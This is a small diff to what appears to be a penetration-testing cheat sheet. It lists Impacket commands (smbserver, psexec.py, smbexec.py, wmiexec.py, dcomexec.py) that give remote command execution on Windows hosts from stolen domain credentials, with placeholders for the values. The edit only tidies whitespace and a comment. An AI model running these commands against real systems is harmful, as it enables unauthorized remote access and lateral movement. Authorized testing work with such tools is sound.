@@ -26,7 +26,5 @@ impacket-smbserver smbFolder $(pwd) -smb2support
 psexec.py <domain-name>/<User>:<Password>@<ip> cmd
 smbexec.py <domain-name>/<User>:<Password>@<ip>
 wmiexec.py <domain-name>/<User>:<Password>@<ip>
-
 dcomexec.py -object MMC20 <domain-name>/<User>:<Password>@<ip>
-# MMC20, 
 ```
